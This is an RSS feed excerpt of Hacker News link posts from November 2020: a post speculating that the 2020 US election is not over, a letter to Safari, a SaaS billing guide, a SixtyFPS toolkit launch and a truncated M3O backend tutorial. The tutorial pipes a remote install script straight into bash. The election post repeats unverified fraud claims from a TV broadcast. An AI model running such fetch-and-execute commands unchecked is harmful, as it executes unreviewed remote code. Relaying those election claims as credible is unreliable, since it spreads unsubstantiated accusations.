            <link>https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069717</guid>
            <pubDate>Thu, 12 Nov 2020 13:41:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Public Safety Announcement: The 2020 Election Is Not Over]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069181">thread link</a>) | @lettergram
<br/>
November 12, 2020 | https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3754">

<div>
<p>I have been listening to my friends and family and am concerned that many are not aware of the election process. Having the presidential election flip from Democrat to Republican at this point can cause massive rioting, violence, etc.</p>
<p>We should all be aware of the current situation and the news outlets do not appear to be informing people.</p>
<blockquote><p><strong>Disclaimer</strong>: I’m am not pro-democrat or pro-republican. Personally, I believe neither party is fit to run the country.</p></blockquote>
<p>I wanted to share what appears to be the Republican strategy and why it’s possible (though still unlikely) Trump could win.</p>
<p>At time of writing Trump the betting markets have <a href="https://electionbettingodds.com/4hr.html" target="_blank" rel="noopener noreferrer">13% odds of winning the election</a> (odds calculated average from <a href="https://www.betfair.com/exchange/plus/politics">Betfair</a> and <a href="https://www.predictit.org/promo/electionbetting">PredictIt</a>).</p>
<p><a href="https://www.predictit.org/markets/detail/3698/Who-will-win-the-2020-US-presidential-election" target="_blank" rel="noopener noreferrer">PredictIt</a> currently has 16% odds of Trump winning:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" alt="" width="500" height="344" srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w"></a></p>
<h3>Biden is not Officially the President-Elect</h3>
<p>The president elect is determined by the electoral college or the General Services Administration (aka Trump conceding). That did not occur.</p>
<p>This is not uncommon, from <a href="https://en.wikipedia.org/wiki/President-elect_of_the_United_States" target="_blank" rel="noopener noreferrer">wikipedia</a>:</p>
<blockquote><p>The closest instance of there being no qualified person to take the presidential oath of office on Inauguration Day happened in 1877 when the disputed election between Rutherford B. Hayes and Samuel J. Tilden was decided and certified in Hayes’ favor just three days before the inauguration (then March 4).</p></blockquote>
<h3>Evidence, Pending Review</h3>
<p>It takes time to build evidence. Last night on <a href="https://www.youtube.com/watch?v=7WzYTSwt18k" target="_blank" rel="noopener noreferrer">Fox News (Hannity, 11/10/2020)</a> the Republicans discussed some of the election (video may be removed, not on Fox News website).</p>
<p>The Republicans claim 11,000+ incident reports of vote manipulation, currently being vetted by attorneys. 250+ affidavits already signed, many have corroborating physical evidence, photos or additional witnesses (unclear how much). In a section below, some specific claims are covered.</p>
<h3>The Voting Recount Process</h3>
<ol>
<li>Affidavit is necessary to challenge some ballots</li>
<li>After canvassing, Republicans can request a recount</li>
<li>A judges in each county can review evidence (aka affidavits, photos, etc)</li>
<li>The judge can remove ballots (at random) based on evidence</li>
<li>Judgements can be challenged to a higher court</li>
<li>Recount occurs after ballots removed</li>
<li>IF it’s so wide spread or there’s a major error. The house or senate decide (or special elections), it depends on the State.</li>
<li>Electors vote on to December 14 and delivered December 23rd [<a href="https://crsreports.congress.gov/product/pdf/IF/IF11641">1</a>]</li>
</ol>
<h4>State Government Affiliation(s)</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Pennsylvania_General_Assembly" target="_blank" rel="noopener noreferrer">PA</a>, <a href="https://en.wikipedia.org/wiki/Michigan_Legislature" target="_blank" rel="noopener noreferrer">MI</a>, <a href="https://en.wikipedia.org/wiki/Wisconsin_Legislature" target="_blank" rel="noopener noreferrer">WI</a> and <a href="https://en.wikipedia.org/wiki/Georgia_General_Assembly" target="_blank" rel="noopener noreferrer">GA</a> have a fairly large republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Arizona_State_Legislature" target="_blank" rel="noopener noreferrer">AZ</a> has a slight republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Nevada_Legislature" target="_blank" rel="noopener noreferrer">NV</a> has a large Democrat majority in both houses</li>
</ul>
<p>It’s also still possible the United States Supreme Court could still toss hundreds of thousands of ballots out of PA (Biden’s up by 40k)[<a href="https://www.washingtonexaminer.com/news/republican-state-attorneys-general-ask-supreme-court-to-take-up-pennsylvania-late-mail-in-ballot-case" target="_blank" rel="noopener noreferrer">2</a>].</p>
<h3>Affidavit Claims</h3>
<p>Selected claims on Fox / Hannity (on 11/10/2020):</p>
<p>1. There was a “software bug” in one jurisdiction, the exact same software was used in half of Michigan and multiple states. Only the one county noted the fix. They want to re-evaluate and manually recount in said counties. Code reviews requested.</p>
<p>2. Pennsylvania USPS (more than one) said the postal service was backdating ballots AND collecting ballots after the date (prior to back dating, i.e. they knew)</p>
<p>3. Michigan had a lot of dead people vote &gt;50 for one county, thus far that they’ve found.</p>
<p>4. All the states have laws enabling the voting process to be accessible to the public, due to COVID-19 they limited public observers, particularly from independents. Legal challenges can occur, as that is against many states laws.</p>
<p>5. Democrat poll watchers were handing out pamphlets on “how to distract GOP poll watchers”</p>
<p>6. Poll watchers claim to have seen ballots with the same or no signatures be counted in Michigan</p>
<h3>Personal Opinion</h3>
<p>Personally, I believe this is the correct course of action. I’m not sure I believe all the claims.</p>
<p>However, I think it’s very important we challenge the votes, see where it falls and improve the Republic. Even if we do it after the election, it’s important we identify fraud and / or improve the process so this doesn’t happen again.</p>
<p>Unfortunately, the news media is not presenting this very well. I am concerned this will lead to a civil war. The Democratic party knows they are not officially the president elect, yet hold press conferences, that look like this…</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" alt="" width="792" height="530" srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w" sizes="(max-width: 792px) 100vw, 792px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w"></a>I’m not convinced this wont lead to violence. I’m concerned because it looks like <em>if the Democrats lose the election.</em> There will be a rival government setup. Several <a href="https://www.cnn.com/2020/11/07/americas/biden-global-reaction-election-intl/index.html" target="_blank" rel="noopener noreferrer">foreign powers have already acknowledged Biden as the victor</a>, for instance.</p>
<p>Personally, I just want a safe environment for my friends and family. I think most of us do.</p>

</div>

</article></div>]]>
            </description>
            <link>https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069181</guid>
            <pubDate>Thu, 12 Nov 2020 12:41:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open Letter to Safari]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069172">thread link</a>) | @z3t4
<br/>
November 12, 2020 | https://xn--zta-qla.com/en/blog/safari_vs_semantics.htm | <a href="https://web.archive.org/web/*/https://xn--zta-qla.com/en/blog/safari_vs_semantics.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>Hello Safari team!</p>

<p>My name is Johan, and I work as a web developer.</p>

<p>I like semantic HTML elements and when creating web sites I try to avoid div's.</p>

<p>The reason why I prefer semantic elements is that they make editing easier.<br>
I have a vision that ordinary people should be able to write documents for the web!</p>

<!--
<p>Even though the web have existed for over 30 years, it's still the best way to share documents,
not only can you share documents, you can make *interactive* documents, and link to <i>other</i> documents.
Heck you can even share a "document" that is a full fledged application (web app).
The web is still lightyears ahead of Execl and Word, yet there are more people writing in Excel and Word then there are people writing web pages/documents ...</p>
-->

<h2>Web development</h2>

<p>It's my job as a web developer to make these "documents" easily accessible.<br>
And with accessible I mean it should not only be accessible by people with different forms of blindness,
it should be accessible for editing too. 
And one thing that helps with accessibility is semantic elements:
Instead of using div elements and CSS class names as markup, I try to use semantic elements and as little CSS classes as possible.
This makes the web pages more accessible for everyone.<br>
There is only one problem though:</p>

<h2>Safari Reader mode</h2>

<p>I work with a good designer that can make very beautiful "documents" (web pages).
But if I use semantic elements like &lt;section&gt; Safari will automatically put the page in "reader mode", 
which means all design goes "poof" and the layout is mangled.<br>
And the only way to avoid "reader mode" in Safari is to <i>not use semantic elements</i>.<br>
So please Safari - let me use semantic HTML elements - and let users enjoy the beautiful design.</p>

<!-- *kommentera-mera* -->

<hr>

<p>Written by  November 11th, 2020.</p>


</div></div>]]>
            </description>
            <link>https://xn--zta-qla.com/en/blog/safari_vs_semantics.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069172</guid>
            <pubDate>Thu, 12 Nov 2020 12:40:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best way to do billing for a SaaS MVP]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069132">thread link</a>) | @nrthrn
<br/>
November 12, 2020 | https://voucherly.app/best-mvp-billing-system-for-saas/ | <a href="https://web.archive.org/web/*/https://voucherly.app/best-mvp-billing-system-for-saas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-elementor-type="wp-page" data-elementor-id="126" data-elementor-settings="[]">
						<div>
							<div>
							<section data-id="4143da05" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;,&quot;shape_divider_bottom&quot;:&quot;clouds&quot;,&quot;shape_divider_bottom_negative&quot;:&quot;yes&quot;}">
							
						
					<div>
							<div>
					<div data-id="2e20b508" data-element_type="column">
			<div>
							<div>
						<div data-id="bfc7933" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="300" height="150" src="https://voucherly.app/wp-content/uploads/2020/10/Voucherly-Logo-1.png" alt="" loading="lazy">											</p>
				</div>
				</div>
				<div data-id="6f6d3033" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>How to setup the best billing system for a SaaS product MVP.​</h2>		</p>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="49dee567" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
							<div>
					<div data-id="1b805f10" data-element_type="column">
			<div>
							<div>
						<div data-id="66fd27ce" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>When starting with the early version or MVP of your SaaS product, setting up the right user management and billing system that offers the most flexibility for the cheapest dollar is key. This is a guide on recommendations built on trial and error and experience on the best billing flow and requirements for the MVP of a SaaS product.&nbsp;<span>These recommendations do expect you either have a “plan based” or “freemium” model for your SaaS product.</span></p></div>
				</div>
				</div>
				<div data-id="5f92ac4c" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Here is what you need from your MVP’s billing system:</p><ol><li><p>Handling automatic billing for a monthly subscription (or one time, depending on your app model).</p></li><li><p>The ability to easily change and adapt your packages, so you can test pricing and packaging.</p></li><li><p>Finally, the ability to participate in other acquisition methods: giveaways, bundles, annual contracts or app marketplaces.</p></li></ol></div>
				</div>
				</div>
				<div data-id="0013a71" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Before we dive into the different methods. Please know that this is built from my experience and my investment dollars. I have built multiple SaaS ventures over the years, and have made many mistakes around that billing process. I have made it too complex and never got the value out of the added complexity (one of my ventures was for parents of school children, later pivoted to school boards); and I have also made the mistake of too simple, and then stuck without any flexibility (such as need 2 and 3 above).</span></p></div>
				</div>
				</div>
				
				<div data-id="4dfbb32" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>1. Stripe Only (or similar payment processor)</h2>		</p>
				</div>
				<div data-id="903f28f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Using only Stripe as your payment middleman means that every new account creation will need to go through the subscription step on your platform. It is the simplest, but suddenly you will find yourself without the flexibility to “give away” an account to a reviewer or beta tester, and also lack the ability to handle acquisition channels like the marketplaces and giveaways mentioned. Lastly, in beta testing, you will be limited to paid beta tests, which is not ideal for many applications and services.</span></p></div>
				</div>
				</div>
				<div data-id="80d9ee6" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>2. Stripe and discount codes</h2>		</p>
				</div>
				<div data-id="46a9fb5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>One of the e-commerce inspired workarounds is to continue to use Stripe but add discount codes. One of the main challenges in discount codes (vs vouchers), is that 1-to-many vs 1-to-1 relationship. You can drop a discount code into a Reddit post and suddenly are need to now manage multiple discount codes and tracking where/how/who they are being used. I am sure you have googled the web for discount codes or relied on Honey to find cheap things before! Ideally you do not open yourself to this challenge just yet.</span></p><p>Another problem with discount codes is that the 3rd need above (those alternate acquisition channels) need to have that 1-to-1 experience, and therefore will not accept discount codes. You have gained a way to test pricing and packaging, but also opened up some challenges.</p></div>
				</div>
				</div>
				<div data-id="f8d4400" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>3. Stripe, manual account creation, and vouchers.</h2>		</p>
				</div>
				<div data-id="01fe8d8" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Manual account creation is probably throwing you through a loop, why have that and Stripe? The answer is quite simple here. Stripe is providing your automation, creating and handling the billing for customers that are entering through the main channel of your application. However if you have the ability to create a customer on the backend, which bypasses Stripe, you open yourself up to a lot of flexibility.</span></p><p>Here are some examples of accounts I would manually create:</p><ul><li><p>Testing accounts for trying out the flow or bug hunting.</p></li><li><p>An “ideal account” one that is fully setup as an ideal customer would. This is your “stage” for screenshots, video clips, and demonstrating the platform.</p></li><li><p>Creating an account for someone to access and use the platform for free: often people giving feedback, app reviewers, friends, investors, etc.</p></li><li><p>Annual contracts: If someone would rather pay annually or quarterly, I would create their account and then handle billing in Quickbooks or Freshbooks.</p></li><li><p>Participate in marketplaces, bundles, giveaways and other systems.</p></li><li><p>Betas and early adopter participation.</p></li></ul><p>For some of those manually created accounts, having a voucher system is key. I mentioned before the important of using vouchers versus discount codes, but let’s focus on the MVP way to do this. If you have manual account creation, you can pre-create a number of accounts that bypass Stripe, which you will use for different needs. Assigning a voucher code to each username/password and uploading to Voucherly allows you to then sell on marketplaces, launch a giveaway, participate in a software bundle, resellers, or even betas. How it works is that Voucherly takes over the role of getting the new users information, sending the new account credentials and ensure the voucher codes are valid. It is a thousand times cheaper that building it into your MVP, and a requirement for many of those acquisition channels.</p></div>
				</div>
				</div>
				<div data-id="04e656a" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>To wrap it all up,<strong> your ideal MVP platform flow should be the third option.</strong></p><p>It gives the highest level of flexibility with minimal effort. With the voucher system being outside of the application and no-code, it cuts down on the development time and complexity, and the manual account creation gives you flexibility to try different acquisition channels.</p><p>To help you get started we have put together a template of billing system requirements that you can use for your own SaaS product. To get access, join the Voucherly waitlist.</p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="92f9168" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;shape_divider_top&quot;:&quot;wave-brush&quot;}">
					
					<div>
							<div>
					<div data-id="6ba8b6d5" data-element_type="column">
			<div>
							<div>
						
				
				<div data-id="180a1eb5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Any doubt? Or want to jump to the top on the waitlist?</p><p><span><a href="mailto:tyler@nrthrn.io">Contact us</a></span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
						</div>
					</div></div>]]>
            </description>
            <link>https://voucherly.app/best-mvp-billing-system-for-saas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069132</guid>
            <pubDate>Thu, 12 Nov 2020 12:34:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SixtyFPS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069043">thread link</a>) | @ogoffart
<br/>
November 12, 2020 | https://sixtyfps.io/blog/introducing-sixtyfps.html | <a href="https://web.archive.org/web/*/https://sixtyfps.io/blog/introducing-sixtyfps.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
    <section>
        <div>

    
    <h5>Posted on November 10, 2020</h5>
    

  <p>We’re Olivier &amp; Simon - two enthusiastic software engineers who enjoy developing software for product
    teams. Today we’d like to introduce you to our new venture.</p>
  <h3 id="what-is-sixtyfps">What is SixtyFPS?</h3>

  <p><strong>A fresh, new graphical toolkit for desktop apps and embedded devices</strong></p>
  <p>
    We're building a product to make UI development faster and easier, no matter what programming language, platform, or
    form-factor. Our toolkit consists of the following key components:
  </p><ul>
    <li>A design-friendly <span>markup language</span> for UI elements</li>
    <li>A run-time library with <span>APIs in C++, Rust and JavaScript</span></li>
    <li>An optimizing <span>compiler</span> to compile designs to native C++/Rust
    </li>
  </ul>

  

  <h3 id="express-user-interface-constraints-and-relations">Express user interface constraints and
    relations</h3>
  <p>Designing a user interface starts with primitive graphical elements, such as shapes or images. The design you
    envision requires placing these elements on a display surface, based on a coordinate system, to produce a visual
    hierarchy. We use our <code>.60</code> markup language to define these elements, where and how they are placed,
    and
    how they exchange data. Let’s have a look at an example:</p>
  
  <div>
    <div>
      <div>
        <p>Code</p>
        <hr>
        <p><img src="https://sixtyfps.io/blog/introducing-sixtyfps/hello_world.png" alt="Hello World Example">
      </p></div>
      <div>
        <p>Screenshot</p>
        <hr>
        <p><img src="https://sixtyfps.io/blog/introducing-sixtyfps/hello_world_screenshot.png" alt="Hello World Screenshot">
      </p></div>
    </div>

  </div>
  <p>This snippet of code describes a rectangle and a text element that render a button. It looks like a blend of
    <code>JSON</code> and <code>CSS</code>, which is intentional. We took the structural aspect of <code>JSON</code>,
    added the nice aspects of <code>CSS</code>, such as numbers with absolute or relative lengths, named colors, and
    layouts. We also added an automatic property binding system.</p>
  <p>There’s a lot more to unpack here. Our constantly-evolving <a href="https://github.com/sixtyfpsui/sixtyfps/blob/master/docs/langref.md">markup language reference
      documentation</a> is a good starting point for a deeper dive. You can also play with the example above in our
    <a href="https://sixtyfps.io/editor/?load_url=https://sixtyfps.io/blog/introducing-sixtyfps/hello_world.60">experimental
      online editor</a>.</p>
  <h3 id="performance">Performance</h3>
  <figure>
    <a href="https://www.sixtyfps.io/demos/printerdemo">
      <img src="https://sixtyfps.io/resources/printerdemo_screenshot.png" alt="Screenshot of Printer Demo">
      <figcaption>Screenshot of the printer demo</figcaption>
    </a>
  </figure>
  <p>As chipsets become faster and RAM becomes cheaper, the scale at which computing devices are produced for our
    appliances grows. In our experience, software that uses less CPU and memory will always have an edge. An optimized
    software stack means that save money on the per-unit hardware cost.</p>
  <p>We are committed to providing that edge through:</p>
  <ul>
    <li>Our <code>.60</code> markup compiler generates a carefully designed memory layout. All the components and
      properties are in one flat memory allocation that is compact and requires minimal <code>malloc</code> calls.
    </li>
    <li>Our lightweight property system evaluates binding expressions lazily.</li>
    <li>Our rendered uses GPU acceleration by default.</li>
  </ul>
  <p>Check out our <a href="https://sixtyfps.io/#demos">demos online</a> to get a feeling for how smooth UIs can
    be,
    even when compiled to run in a web browser simulation.</p>
  <h3 id="integrate-into-different-languages">Integrate into different languages</h3>
  <p>One particular aspect of software development that we enjoy is the diverse landscape. Different teams use
    different
    programming languages, with their unique constraints and talent pools. We embrace this diversity and believe that
    a
    good UI toolkit should support this by making every language feel as if it’s the native toolkit. It’s crucial to
    provide idiomatic APIs, so that teams can feel right at home. We do this by making sure that:</p>
  <ol type="1">
    <li>Our C++ integration uses modern C++ 17 and comes with built-in CMake support.</li>
    <li>For Rust developers, we offer a convenient crate, <code>build.rs</code> integration, and even a proc-macro.
    </li>
    <li>Our NodeJS integration is available via <code>npm</code> and allows you to write signal handlers in JavaScript
      and
      even provide custom data models.</li>
  </ol>
  <p>Check out our <a href="https://sixtyfps.io/#tryout">API documentation for the different languages</a>.</p>
  <p>We choose to first support this set of langages because it is the implementation language, another low level
    language, and a dynamic language.
    We believe that it will be easy to extend the integration into more programming languages later.</p>

  <h2 id="whats-next">What’s next?</h2>
  <p>Our project is still in an alpha state. We would love to get your feedback; give it a try. You can provide feedback
    or join our discussions on <a href="https://github.com/sixtyfpsui/sixtyfps">our
      GitHub</a> site.</p>
  <p>In the next few months we're looking forward to completing an off-the-shelf version 1.0. SixtyFPS
    in its current shape is a highly customizable, compelling starting point for new UI product developments and
    prototypes.</p>
  <p>We're be happy to engage in contracting work to explore custom UI development projects with
    SixtyFPS.
  </p>
  <p>Get in touch with us via <a href="mailto:info@sixtyfps.io">email</a>.</p>


    </div>
</section>

    


    </div></div>]]>
            </description>
            <link>https://sixtyfps.io/blog/introducing-sixtyfps.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069043</guid>
            <pubDate>Thu, 12 Nov 2020 12:23:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Netlify for the frontend, Micro for the backend]]>
            </title>
            <description>
<![CDATA[
Score 137 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25068782">thread link</a>) | @chuhnk
<br/>
November 12, 2020 | https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html | <a href="https://web.archive.org/web/*/https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">M3O</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-11-12">12 Nov 2020</time>
            
        </span> -->

        <!-- <h1 class="post-title">Netlify for the frontend, Micro for the backend</h1> -->

        <section>
            <p><br>
Today Netlify has emerged as the modern platform for rapidly building web applications without having to worry about anything beyond your code. We at <a href="https://m3o.com/">Micro</a>
are users of Netlify and have bought into this phenomenal experience. What’s more Netlify has demonstrated to us a breakdown in the classic web architecture 
stack which previously combined web and api concerns in a single place. As we moved through a tiered architecture frontend had not been given anything more 
than hints on how to consume dynamic content from the backend. Today we’re all calling this the <a href="https://jamstack.org/">Jamstack</a>.</p>

<h2 id="jamstack">Jamstack</h2>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b7d16f7f3654fb8572360301e60d76df254a323e/385ec/img/svg/architecture.svg"></p>
<center><i><small>Credit jamstack.org</small></i></center>
<p><br>
The jamstack rethinks the frontend architecture by separating the concerns of static and dynamic content and pushing for the dynamic side to be consumed 
through APIs and services. Effectively, Netlify embracing this model has tried to build microservices for the frontend and moved towards a unification 
of consumption of services via APIs on the backend. It’s clear this is the architecture of the future for the web and the majority of cloud services 
will be built and consumed soley as APIs.</p>

<p>The one question we’ve really been seeing a lot though is “What’s Netlify for the backend?”. Many of those frontend users building Jamstack apps on 
Netlify are looking to where they can find and build these APIs. It seems even Netlify’s current answer has been, “go host something on heroku”. I think 
in 2020 this just doesn’t fly. If the frontend is being reimagined then the same has to happen on the backend to cater for that use.</p>

<h2 id="netlify-for-the-backend">Netlify for the Backend</h2>

<p><img src="https://blog.m3o.com/assets/images/netlify.png"></p>

<p><a href="https://m3o.com/"><strong>M3O</strong></a> is a platform for cloud services development. The fastest way to build APIs without managing the infrastructure. M3O makes use of 
<a href="https://micro.mu/"><strong>Micro</strong></a>, an open source platform for microservices development. What we get from Micro is a powerful framework for building, running 
and consuming APIs as microservices. What M3O brings to the table is Micro as a Service, a fully managed platform for building microservices. Write services 
in Go and gRPC on the backend, expose them dynamically via HTTP API to be consumed by the frontend. M3O looks to fill that gap in the market for frontend 
devs. M3O is Netlify for the backend.</p>

<h2 id="m3o-features">M3O Features</h2>

<p>As we mentioned, M3O is a fully managed <a href="https://micro.mu/">Micro</a> services platform. What does that mean? Micro provides the building blocks for 
writing, running and consuming microservices. From source to running and beyond. M3O takes that and hosts it so you can just get on with writing 
APIs without worrying about the underlying infrastructure.</p>

<p>Here’s a few of the key features and services:</p>

<ul>
  <li><strong>Microservices development</strong> using <a href="https://grpc.io/">gRPC</a> and protobuf code generation</li>
  <li><strong>Service runtime</strong> and process lifecycle management</li>
  <li><strong>Source to running</strong> builds without need for CI/CD</li>
  <li><strong>Authentication and authorization</strong> for access control and user management</li>
  <li><strong>Dynamic configuration</strong> and secrets management</li>
  <li><strong>PubSub messaging</strong> and event streaming</li>
  <li><strong>Service discovery</strong> and secure networking</li>
  <li><strong>Key-value storage</strong> and persistent CRUD</li>
  <li><strong>Automatic HTTP routing</strong> with path based resolution</li>
  <li><strong>Identity aware proxy</strong> for remote access and gRPC-web apps</li>
  <li><strong>Public API gateway</strong> and TLS support by default</li>
  <li><strong>Public and private repos</strong> support including  github, gitlab and bitbucket</li>
</ul>

<p>M3O is a feature complete platform for microservices development from generating service templates on your local machine through to writing and running 
it in the cloud all using the same Micro CLI experience. M3O exposes HTTPS urls for you dynamically by default. So every service automatically becomes 
an API as soon as you deploy it.</p>

<p>Where a new development model has emerged for the frontend, we think its dictating the “headless” paradigm shift for the backend and M3O wants to be there 
to host all of those APIs as Micro services.</p>

<h2 id="api-first">API First</h2>

<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/0znow24kgpu2dp3zg60n.png"></p>

<p>We are seeing the emergence of APIs as the dominant form factor for cloud services, from AWS all the way through to Twilio and Stripe. What’s even more 
compelling is while this model has emerged in the past few years, we are only really just getting started. It’s our belief that in a decade from now 
some of the most important companies will be API first yet strangely there is no platform to caters to this form of development.</p>

<p>Twilio, Stripe and others have all had to build out the infrastructure for their API first approach. We think as many more companies go down this path 
the tools must emerge to empower them, not just at the compute layer but by providing the higher level abstractions required. That’s the goal of M3O.</p>

<p>But don’t just take our word for it. We’re going to walk you through a demonstration of the value proposition so you can see for yourself just how 
powerful Micro and M3O are.</p>

<h2 id="building-a-backend">Building a backend</h2>

<p>You’re going to be writing and deploying APIs in minutes rather than hours or days! No more dealing with infrastructure on the 
backend, just as Netlify empowered devs on the frontend, we’re doing the same for a new generation of developers on the backend.</p>

<p>Let’s walk you through it. We’ll deploy an existing Micro blog service with this demo frontend on Netlify: <a href="https://loving-goodall-44ee08.netlify.app/">https://loving-goodall-44ee08.netlify.app/</a>. But first let’s start with signup.</p>

<h3 id="signup-to-m3o">Signup to M3O</h3>

<p>First you start by signing up to M3O and registering for a free account in our Dev environment.</p>

<p>Start by installing micro</p>

<div><div><pre><code>curl <span>-fsSL</span> https://install.m3o.com/micro | /bin/bash
</code></pre></div></div>

<p>For those wary of curl into bash, you can view it first <a href="https://install.m3o.com/micro">https://install.m3o.com/micro</a>.</p>

<p>Signup is purely CLI based for now so just issue the following command and follow the steps</p>



<p>Once you’re done you should have an account on M3O and be automatically logged in.</p>

<h3 id="run-helloworld">Run Helloworld</h3>

<p>Validate that by running helloworld.</p>

<div><div><pre><code>micro run github.com/micro/services/helloworld
</code></pre></div></div>

<p>Check it’s running and try call it via the CLI.</p>

<div><div><pre><code><span># check the status</span>
micro status

<span># call helloworld</span>
micro call helloworld <span>--name</span><span>=</span><span>"Alice"</span>
</code></pre></div></div>

<p>OK now we get to the more interesting part. Call it via the HTTP API that’s dynamically generated for you.</p>

<div><div><pre><code><span># get your namespace</span>
<span>NAMESPACE</span><span>=</span><span>$(</span>micro user namespace<span>)</span>

<span># curl your unique url</span>
curl <span>"https://</span><span>$NAMESPACE</span><span>.m3o.com/helloworld?name=Alice"</span>
</code></pre></div></div>

<p>If alls good, we can move on to running something a bit more interesting.</p>

<h3 id="deploying-a-dynamic-blog-backend">Deploying a dynamic blog backend</h3>

<p>We’re going to deploy a headless CMS, or better known as a Blog API.</p>

<p>On the open source side, Micro maintains some reusable example services we can all play with and contribute back to. 
You can check them out at <a href="https://github.com/micro/services">github.com/micro/services</a>. Let’s bootstrap the blog 
using a couple of them.</p>

<p>Because Micro is all about microservices development, we’ve decomposed the blog API into posts, comments and tags. 
Right now we’ll focus on posts and tags. You can find the code in <a href="https://github.com/micro/services/tree/master/blog">https://github.com/micro/services/tree/master/blog</a>.</p>

<p>Deploying these is super simple.</p>

<div><div><pre><code><span># run the posts service</span>
micro run github.com/micro/services/blog/posts

<span># run the tags service</span>
micro run github.com/micro/services/blog/tags
</code></pre></div></div>

